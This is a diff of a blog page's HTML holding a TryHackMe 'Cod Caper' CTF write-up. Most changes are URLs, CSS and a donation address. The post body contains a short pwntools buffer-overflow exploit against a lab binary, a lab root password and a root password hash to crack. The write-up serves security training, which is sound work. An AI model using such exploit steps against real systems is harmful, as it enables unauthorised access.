@@ -14,23 +14,23 @@
     <meta property="og:type" content="article" />
     <meta property="og:title" content="thecodcaper CTF | write-up" />
     <meta property="og:description" content="Hello everyone, today&#x27;s CTF is so impressive, not rated yet but from my little experience I can tell there&#x27;s no easy or hard challenge, it&#x27;s all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope" />
-    <meta property="og:url" content="https://fr33s0ul.tech/thecodca/" />
-    <meta property="og:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/pgn.png" />
+    <meta property="og:url" content="http://localhost:2368/thecodca/" />
+    <meta property="og:image" content="http://localhost:2368/content/images/2020/04/pgn.png" />
     <meta property="article:published_time" content="2020-04-14T18:52:00.000Z" />
-    <meta property="article:modified_time" content="2020-11-21T15:24:21.000Z" />
+    <meta property="article:modified_time" content="2022-03-24T15:36:59.000Z" />
     <meta property="article:tag" content="CTF" />
     
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="thecodcaper CTF | write-up" />
     <meta name="twitter:description" content="Hello everyone, today&#x27;s CTF is so impressive, not rated yet but from my little experience I can tell there&#x27;s no easy or hard challenge, it&#x27;s all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope" />
-    <meta name="twitter:url" content="https://fr33s0ul.tech/thecodca/" />
-    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/pgn.png" />
+    <meta name="twitter:url" content="http://localhost:2368/thecodca/" />
+    <meta name="twitter:image" content="http://localhost:2368/content/images/2020/04/pgn.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="fr33s0ul" />
     <meta name="twitter:label2" content="Filed under" />
     <meta name="twitter:data2" content="CTF" />
-    <meta name="twitter:site" content="@fr3350u1" />
-    <meta name="twitter:creator" content="@fr33soul_" />
+    <meta name="twitter:site" content="@fr33s0ul_Ninja" />
+    <meta name="twitter:creator" content="@fr33s0ul_Ninja" />
     <meta property="og:image:width" content="725" />
     <meta property="og:image:height" content="465" />
     
@@ -41,10 +41,10 @@
     "publisher": {
         "@type": "Organization",
         "name": "fr33s0ul",
-        "url": "https://fr33s0ul.tech/",
+        "url": "http://localhost:2368/",
         "logo": {
             "@type": "ImageObject",
-            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/logo.gif",
+            "url": "http://localhost:2368/content/images/2020/03/logo.gif",
             "width": 300,
             "height": 41
         }
@@ -54,22 +54,22 @@
         "name": "fr33s0ul",
         "image": {
             "@type": "ImageObject",
-            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/asdasd.gif",
+            "url": "http://localhost:2368/content/images/2020/03/asdasd.gif",
             "width": 600,
             "height": 594
         },
-        "url": "https://fr33s0ul.tech/author/fr33s0ul/",
+        "url": "http://localhost:2368/author/fr33s0ul/",
         "sameAs": [
-            "https://twitter.com/fr33soul_"
+            "https://twitter.com/fr33s0ul_Ninja"
         ]
     },
     "headline": "thecodcaper CTF | write-up",
-    "url": "https://fr33s0ul.tech/thecodca/",
+    "url": "http://localhost:2368/thecodca/",
     "datePublished": "2020-04-14T18:52:00.000Z",
-    "dateModified": "2020-11-21T15:24:21.000Z",
+    "dateModified": "2022-03-24T15:36:59.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/04/pgn.png",
+        "url": "http://localhost:2368/content/images/2020/04/pgn.png",
         "width": 725,
         "height": 465
     },
@@ -77,12 +77,12 @@
     "description": "Hello everyone, today&#x27;s CTF is so impressive, not rated yet but from my little\nexperience I can tell there&#x27;s no easy or hard challenge, it&#x27;s all about how\nout-of-the-box can you think. but no worries this one does have hints and the\ntechniques are provided with the questioner. anyways! hope you guys enjoy this\nwrite-up, Let&#x27;s enumerate machine!\n\n [https://giphy.com/gifs/cbs-306-seal306-seal-team-jVZmRHItLSlGE1SYBV]\n\nroot@kali:~# nmap -sV -sC 10.10.201.143\nStarting Nmap 7.80 ( https://nmap.org ) ",
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "https://fr33s0ul.tech/"
+        "@id": "http://localhost:2368/"
     }
 }
     </script>
 
-    <meta name="generator" content="Ghost 3.38" />
+    <meta name="generator" content="Ghost 4.41" />
     <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../../rss/index.html" />
 
     <style amp-custom>
@@ -207,7 +207,7 @@
     }
 
     a {
-        color: #1292EE;
+        color: var(--ghost-accent-color, #1292EE);
         text-decoration-skip-ink: auto;
     }
 
@@ -355,7 +355,20 @@
         top: 0;
         bottom: 0;
         width: 0.3rem;
-        background: #000;
+        background: var(--ghost-accent-color, #1292EE);
+    }
+
+    .post-content blockquote.kg-blockquote-alt {
+        font-size: 1.2em;
+        font-style: italic;
+        line-height: 1.6em;
+        text-align: center;
+        color: #738a94;
+        padding: 0.75em 3em 1.25em;
+    }
+
+    .post-content blockquote.kg-blockquote-alt::before {
+        display: none;
     }
 
     .post-content :not(.kg-card):not([id]) + .kg-card {
@@ -386,7 +399,7 @@
         font-weight: 400;
         font-size: 0.9em;
         line-height: 1em;
-        color: #dc0050;
+        color: #15171a;
         background: #f0f6f9;
         border-radius: 0.25em;
     }
@@ -452,7 +465,7 @@
         background: rgba(255,255,255,0.6);
         font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
         text-decoration: none;
-        border-radius: 5px;
+        border-radius: 3px;
         box-shadow: 0 2px 6px -2px rgba(0, 0, 0, 0.1), 0 0 1px rgba(0, 0, 0, 0.4);
         overflow: hidden;
     }
@@ -532,6 +545,398 @@
     .kg-bookmark-publisher::before {
         content: "•";
         margin: 0 .5em;
+    }
+
+    .kg-toggle-card-icon {
+        display: none;
+    }
+
+    .kg-toggle-content {
+        margin-top: 0.8rem;
+    }
+
+    .kg-product-card-container {
+        background: transparent;
+        padding: 20px;
+        width: 100%;
+        border-radius: 5px;
+        box-shadow: inset 0 0 0 1px rgb(124 139 154 / 25%);
+    }
+
+    .kg-product-card-description p {
+        margin-top: 1.5em;
+    }
+
+    .kg-product-card-description ul {
+        margin-left: 24px;
+    }
+
+    .kg-product-card-title {
+        font-size: 1.9rem;
+        font-weight: 700;
+    }
+
+    .kg-product-card-rating-star {
+        height: 28px;
+        width: 20px;
+        margin-right: 2px;
+    }
+
+    .kg-product-card-rating-star svg {
+    width: 16px;
+    height: 16px;
+    fill: currentColor;
+    opacity: 0.15;
+    }
+
+    .kg-product-card-rating-active.kg-product-card-rating-star svg {
+    opacity: 1;
+    }
+
+    .kg-nft-card-container {
+        position: relative;
+        display: flex;
+        flex: auto;
+        flex-direction: column;
+        text-decoration: none;
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        font-size: 1.4rem;
+        font-weight: 400;
+        box-shadow: 0 2px 6px -2px rgb(0 0 0 / 10%), 0 0 1px rgb(0 0 0 / 40%);
+        width: 100%;
+        max-width: 512px;
+        color: #15212A;
+        background: #fff;
+        border-radius: 5px;
+        transition: none;
+        margin: 0 auto;
+    }
+
+    .kg-nft-metadata {
+        padding: 2.0rem;
+    }
+
+    .kg-nft-image-container {
+        position: relative;
+    }
+
+    .kg-nft-image {
+        display: flex;
+        border-radius: 5px 5px 0 0;
+    }
+
+    .kg-nft-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        gap: 20px;
+    }
+
+    .kg-nft-header h4.kg-nft-title {
+        font-size: 1.9rem;
+        font-weight: 700;
+        margin: 0;
+        color: #15212A;
+    }
+
+    .kg-nft-header amp-img {
+        max-width: 114px;
+        max-height: 26px;
+    }
+
+    .kg-nft-opensea-logo {
+        margin-top: 2px;
+        width: 100px;
+    }
+
+    .kg-nft-creator {
+        font-family: inherit;
+        color: #95A1AD;
+    }
+
+    .kg-nft-creator span {
+        font-weight: 500;
+        color: #15212A;
+    }
+
+    .kg-nft-card p.kg-nft-description {
+        font-size: 1.4rem;
+        line-height: 1.4em;
+        margin: 2.0rem 0 0;
+        color: #222;
+    }
+
+    .kg-button-card {
+        display: flex;
+        position: static;
+        align-items: center;
+        width: 100%;
+        justify-content: center;
+    }
+
+    .kg-btn {
+        display: flex;
+        position: static;
+        align-items: center;
+        padding: 0 2.0rem;
+        height: 4.0rem;
+        line-height: 4.0rem;
+        font-size: 1.65rem;
+        font-weight: 600;
+        text-decoration: none;
+        border-radius: 5px;
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .kg-btn:hover {
+        opacity: 0.85;
+    }
+
+    .kg-btn-accent {
+        background-color: var(--ghost-accent-color, #1292EE);
+        color: #fff;
+    }
+
+    .kg-callout-card {
+        display: flex;
+        padding: 20px 28px;
+        border-radius: 3px;
+    }
+
+    .kg-callout-card-grey {
+        background: rgba(124, 139, 154, 0.13);
+    }
+
+    .kg-callout-card-white {
+        background: transparent;
+        box-shadow: inset 0 0 0 1px rgba(124, 139, 154, 0.25);
+    }
+
+    .kg-callout-card-blue {
+        background: rgba(33, 172, 232, 0.12);
+    }
+
+    .kg-callout-card-green {
+        background: rgba(52, 183, 67, 0.12);
+    }
+
+    .kg-callout-card-yellow {
+        background: rgba(240, 165, 15, 0.13);
+    }
+
+    .kg-callout-card-red {
+        background: rgba(209, 46, 46, 0.11);
+    }
+
+    .kg-callout-card-pink {
+        background: rgba(225, 71, 174, 0.11);
+    }
+
+    .kg-callout-card-purple {
+        background: rgba(135, 85, 236, 0.12);
+    }
+
+    .kg-callout-card-accent {
+        background: var(--ghost-accent-color);
+        color: #fff;
+    }
+
+    .kg-callout-card-accent a {
+        color: #fff;
+    }
+
+    .kg-callout-emoji {
+        padding-right: 16px;
+        line-height: 1.3;
+        font-size: 1.25em;
+    }
+
+    .kg-header-card {
+        padding: 6em 3em;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+    }
+
+    .kg-header-card.kg-size-small {
+        padding-top: 4em;
+        padding-bottom: 4em;
+    }
+
+    .kg-header-card.kg-size-large {
+        padding-top: 12em;
+        padding-bottom: 12em;
+    }
+
+    .kg-header-card.kg-width-full {
+        padding-left: 4em;
+        padding-right: 4em;
+    }
+
+    .kg-header-card.kg-align-left {
+        text-align: left;
+        align-items: flex-start;
+    }
+
+    .kg-header-card.kg-style-dark {
+        background: #15171a;
+        color: #ffffff;
+    }
+
+    .kg-header-card.kg-style-light {
+        color: #15171a;
+        border: 1px solid rgba(124, 139, 154, 0.25);
+        border-width: 1px 0;
+    }
+
+    .kg-header-card.kg-style-accent {
+        background-color: var(--ghost-accent-color);
+    }
+
+    .kg-header-card.kg-style-image {
+        background-color: #e7e7eb;
+        background-size: cover;
+        background-position: center center;
+    }
+
+    .kg-header-card h2 {
+        font-size: 4em;
+        font-weight: 700;
+        line-height: 1.1em;
+        margin: 0;
+    }
+
+    .kg-header-card h2 strong {
+        font-weight: 800;
+    }
+
+    .kg-header-card.kg-size-small h2 {
+        font-size: 3em;
+    }
+
+    .kg-header-card.kg-size-large h2 {
+        font-size: 5em;
+    }
+
+    .kg-header-card h3 {
+        font-size: 1.25em;
+        font-weight: 500;
+        line-height: 1.3em;
+        margin: 0;
+    }
+
+    .kg-header-card h3 strong {
+        font-weight: 600;
+    }
+
+    .kg-header-card.kg-size-small h3 {
+        font-size: 1em;
+    }
+
+    .kg-header-card.kg-size-large h3 {
+        font-size: 1.5em;
+    }
+
+    .kg-header-card:not(.kg-style-light) h2,
+    .kg-header-card:not(.kg-style-light) h3 {
+        color: #ffffff;
+    }
+
+    .kg-header-card a.kg-header-card-button {
+        display: flex;
+        position: static;
+        align-items: center;
+        padding: 0 1.2em;
+        height: 2.4em;
+        line-height: 1em;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+        font-size: 0.95em;
+        font-weight: 600;
+        text-decoration: none;
+        border-radius: 5px;
+        transition: opacity 0.2s ease-in-out;
+        background-color: var(--ghost-accent-color);
+        color: #ffffff;
+        margin: 1.75em 0 0;
+    }
+
+    .kg-header-card a.kg-header-card-button:hover {
+        opacity: 0.85;
+    }
+
+    .kg-header-card.kg-size-large a.kg-header-card-button {
+        margin-top: 2em;
+    }
+
+    .kg-header-card.kg-size-small a.kg-header-card-button {
+        margin-top: 1.5em;
+    }
+
+    .kg-header-card.kg-style-image a.kg-header-card-button,
+    .kg-header-card.kg-style-dark a.kg-header-card-button {
+        background: #ffffff;
+        color: #15171a;
+    }
+
+    .kg-header-card.kg-style-accent a.kg-header-card-button {
+        background: #ffffff;
+        color: var(--ghost-accent-color);
+    }
+
+    .kg-audio-card {
+        display: flex;
+        width: 100%;
+        box-shadow: inset 0 0 0 1px rgba(124, 139, 154, 0.25);
+    }
+
+    .kg-audio-thumbnail {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 80px;
+        min-width: 80px;
+        height: 80px;
+        background: transparent;
+        object-fit: cover;
+        aspect-ratio: 1/1;
+        border-radius: 3px 0 0 3px;
+    }
+
+    .kg-audio-thumbnail.placeholder {
+        background: var(--ghost-accent-color);
+    }
+
+    .kg-audio-thumbnail.placeholder svg {
+        width: 24px;
+        height: 24px;
+        fill: white;
+    }
+
+    .kg-audio-player-container {
+        position: relative;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        width: 100%;
+        --seek-before-width: 0%;
+        --volume-before-width: 100%;
+        --buffered-width: 0%;
+    }
+
+    .kg-audio-title {
+        width: 100%;
+        padding: 8px 12px 0;
+        border: none;
+        font-family: inherit;
+        font-size: 1.1em;
+        font-weight: 700;
+        background: transparent;
+    }
+
+    .kg-audio-player {
+        display: none;
     }
 
     .kg-width-full.kg-card-hascaption {
@@ -642,6 +1047,8 @@
             font-size: 1.7rem;
         }
     }
+
+    :root {--ghost-accent-color: #15171A;}
     </style>
 
     <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
@@ -654,7 +1061,7 @@
 <body class="amp-template">
     <header class="page-header">
         <a href="../../index.html">
-                <amp-img class="site-icon" src="https://fr33s0ul.tech/content/images/size/w1000/2020/04/download.png" width="50" height="50" layout="fixed"></amp-img>
+                <amp-img class="site-icon" src="http://localhost:2368/content/images/2020/04/download.png" width="50" height="50" layout="fixed"></amp-img>
         </a>
     </header>
 
@@ -669,7 +1076,7 @@
                 </section>
             </header>
             <figure class="post-image">
-                <amp-img src="https://fr33s0ul.tech/content/images/size/w1000/2020/04/pgn.png" width="600" height="340" layout="responsive"></amp-img>
+                <amp-img src="http://localhost:2368/content/images/2020/04/pgn.png" width="600" height="340" layout="responsive"></amp-img>
             </figure>
             <section class="post-content">
 
@@ -810,14 +1217,14 @@ su root
 Password: love2fish
 
 root@ubuntu:/opt/secret#id
-uid=0(root) gid=0(root) groups=0(root)</code></pre><p>Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.<br />We start off the script with:</p><p><code>from pwn import *</code><br /><code>proc = process('/opt/secret/root')</code></p><p>This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.</p><p>We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF(). ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.<br />With the ELF addition our script becomes<br /><code>from pwn import *</code><br /><code>proc = process('/opt/secret/root')</code><br /><code>elf = ELF('/opt/secret/root')</code><br /><code>shell_func = elf.symbols.shell</code><br />shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().</p><p>fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our <code>proc</code> variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.<br />With all that our final exploit script becomes<br /><code>from pwn import *</code><br /><code>proc = process('/opt/secret/root')</code><br /><code>elf = ELF('/opt/secret/root')</code><br /><code>shell_func = elf.symbols.shell</code><br /><code>payload = fit({</code><br /><code>44: shell_func # this adds the value of shell_func after 44 characters</code><br /><code>})</code><br /><code>proc.sendline(payload)</code><br /><code>proc.interactive()</code><br />Save that to a .py file and run it, and you should get this output:</p><figure class="kg-card kg-image-card"></figure><p>Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is <code>$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.</code><strong>"</strong></p><p>Happy hacking!</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com/room/thecodcaper"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | The Cod Caper</div><div class="kg-bookmark-description">A guided room taking you through infiltrating and exploiting a Linux system.</div><div class="kg-bookmark-metadata"><amp-img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" width="552" height="564" layout="responsive"></amp-img><span class="kg-bookmark-publisher">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><amp-img src="https://tryhackme-images.s3.amazonaws.com/room-icons/282c55307eada4ad18a0b06e4d65ff34.jpeg" width="300" height="168" layout="responsive"></amp-img></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | Hacking Training</div><div class="kg-bookmark-description">An online platform for learning and teaching cyber security, all through your browser.</div><div class="kg-bookmark-metadata"><amp-img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" width="552" height="564" layout="responsive"></amp-img><span class="kg-bookmark-publisher">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><amp-img src="https://tryhackme.com/img/favicon.png" width="552" height="564" layout="responsive"></amp-img></div></a></figure><amp-iframe src="https://giphy.com/embed/123GivAQB7k0s8" width="480" height="277" frameborder="0" class="giphy-embed" allowfullscreen sandbox="allow-scripts allow-same-origin" layout="responsive"></amp-iframe><p><a href="https://giphy.com/gifs/the-penguin-123GivAQB7k0s8"></a></p><a href="https://www.patreon.com/bePatron?u=45903047" data-patreon-widget-type="become-patron-button">You can support my content, and help me do more and more by becoming a Patron!</a>
+uid=0(root) gid=0(root) groups=0(root)</code></pre><p>Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.<br />We start off the script with:</p><p><code>from pwn import *</code><br /><code>proc = process('/opt/secret/root')</code></p><p>This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.</p><p>We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF(). ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.<br />With the ELF addition our script becomes<br /><code>from pwn import *</code><br /><code>proc = process('/opt/secret/root')</code><br /><code>elf = ELF('/opt/secret/root')</code><br /><code>shell_func = elf.symbols.shell</code><br />shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().</p><p>fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our <code>proc</code> variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.<br />With all that our final exploit script becomes<br /><code>from pwn import *</code><br /><code>proc = process('/opt/secret/root')</code><br /><code>elf = ELF('/opt/secret/root')</code><br /><code>shell_func = elf.symbols.shell</code><br /><code>payload = fit({</code><br /><code>44: shell_func # this adds the value of shell_func after 44 characters</code><br /><code>})</code><br /><code>proc.sendline(payload)</code><br /><code>proc.interactive()</code><br />Save that to a .py file and run it, and you should get this output:</p><figure class="kg-card kg-image-card"></figure><p>Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is <code>$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.</code><strong>"</strong></p><p>Happy hacking!</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com/room/thecodcaper"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | The Cod Caper</div><div class="kg-bookmark-description">A guided room taking you through infiltrating and exploiting a Linux system.</div><div class="kg-bookmark-metadata"><amp-img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt width="552" height="564" layout="responsive"></amp-img><span class="kg-bookmark-author">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><amp-img src="https://tryhackme-images.s3.amazonaws.com/room-icons/282c55307eada4ad18a0b06e4d65ff34.jpeg" alt width="300" height="168" layout="responsive"></amp-img></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | Hacking Training</div><div class="kg-bookmark-description">An online platform for learning and teaching cyber security, all through your browser.</div><div class="kg-bookmark-metadata"><amp-img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt width="552" height="564" layout="responsive"></amp-img><span class="kg-bookmark-author">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><amp-img src="https://tryhackme.com/img/favicon.png" alt width="552" height="564" layout="responsive"></amp-img></div></a></figure><amp-iframe src="https://giphy.com/embed/123GivAQB7k0s8" width="480" height="277" frameborder="0" class="giphy-embed" allowfullscreen sandbox="allow-scripts allow-same-origin" layout="responsive"></amp-iframe><p><a href="https://giphy.com/gifs/the-penguin-123GivAQB7k0s8"></a></p><figure class="kg-card kg-image-card kg-card-hascaption"><figcaption>Crypto donations are appreciated for more free content and exciting topics <strong>0x684c21519d43E415506c1750c08FA0A97621FFEF</strong></figcaption></figure>
 
             </section>
 
         </article>
     </main>
     <footer class="page-footer">
-            <amp-img class="site-icon" src="https://fr33s0ul.tech/content/images/size/w1000/2020/04/download.png" width="50" height="50" layout="fixed"></amp-img>
+            <amp-img class="site-icon" src="http://localhost:2368/content/images/2020/04/download.png" width="50" height="50" layout="fixed"></amp-img>
         <h3>fr33s0ul</h3>
             <p>Cybersecurity, Technology, and CTFs</p>
         <p><a href="../../index.html">Read more posts →</a></p>
